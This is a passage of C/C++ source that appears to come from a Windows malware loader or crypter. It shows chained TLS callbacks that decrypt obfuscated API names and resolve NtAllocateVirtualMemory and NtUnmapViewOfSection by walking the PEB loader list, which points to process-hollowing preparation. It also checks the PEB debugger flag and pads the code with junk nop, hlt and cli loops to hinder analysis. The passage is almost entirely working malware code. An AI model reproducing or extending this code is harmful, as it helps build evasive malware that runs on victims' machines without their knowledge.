				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				SwitchToThread();
			}
			szCrypt32 = Decrypt(szcCrypt32);
			MapFileAndCheckSumW(wcCmdLine, &dwFileChecksum, &dwRealChecksum);
			DPRINT2("File checksum %08X, real checksum %08X", dwFileChecksum, dwRealChecksum);
			DPRINT1("Start TLS1, PEB = 0x%X",pPEB);
			wcscpy(wcCmdLine,pPEB->ProcessParameters->CommandLine.Buffer);
			#ifdef DBG_OK
				OutputDebugStringW(wcCmdLine);
			#endif
			pCryptStringToBinaryA =(_CryptStringToBinaryA)GetProcAddressNt(3,Decrypt(szcCryptStringToBinaryA));
			scomp = (SCOMP*)szGLOBAL2;
			on_tls_callback2(xx,dwReason,pv);
		}
	}
//--------------------------
	void NTAPI on_tls_callback2(PVOID xx, DWORD dwReason, PVOID pv)
	{
		if(DLL_PROCESS_ATTACH == dwReason) 
		{
			DPRINT("TLS2");
			lex = lex->Flink;
			pld = (PLDR_DATA_TABLE_ENTRY)lex;
			dwNtBase = (HMODULE) pld->BaseAddress;
			pNtAllocateVirtualMemory =  (_NtAllocateVirtualMemory)GetProcAddressNt(0,Decrypt(szcNtAllocateVirtualMemory));
			szAdvapi32 = Decrypt(szcAdvapi32);
			on_tls_callback3(xx,dwReason,pv);
		}
	}

//--------------------------
	void NTAPI on_tls_callback3(PVOID xx, DWORD dwReason, PVOID pv)
	{
		if(DLL_PROCESS_ATTACH == dwReason) 
		{
			DPRINT("TLS3");
			pNtUnmapViewOfSection =  (_NtUnmapViewOfSection)GetProcAddressNt(0,Decrypt(szcNtUnmapViewOfSection));
			lex = lex->Flink;
			f_YES = pPEB->BeingDebugged;
			pld = (PLDR_DATA_TABLE_ENTRY)lex;
			dwKrnlBase = (HMODULE) pld->BaseAddress;
			pNtClose =(_NtClose)GetProcAddressNt(0,Decrypt(szcNtClose));
			dwMemType = dwMemType | MEM_RESERVE;
			_RegisterClassExA pRegisterClassExA;
			pRegisterClassExA = (_RegisterClassExA) GetProcAddressNt(2,Decrypt(szcRegisterClassExA));
			#ifndef TLS
				WaitForSingleObject(CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)pRegisterClassExA,&wcex,0,NULL),INFINITE);
			#else
				pRegisterClassExA(&wcex);
			#endif
			for(j=0;j<LOWORD(dwFakeDWORD)+szFakeDWORD[2];j++)
			{
				__asm{hlt} _asm{cli} _asm{cld} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
				__asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop} _asm{nop}
			}
			pRegisterClassExA = NULL;
		}
	}
//---------------------------------------------------------------------------------------------------------------------
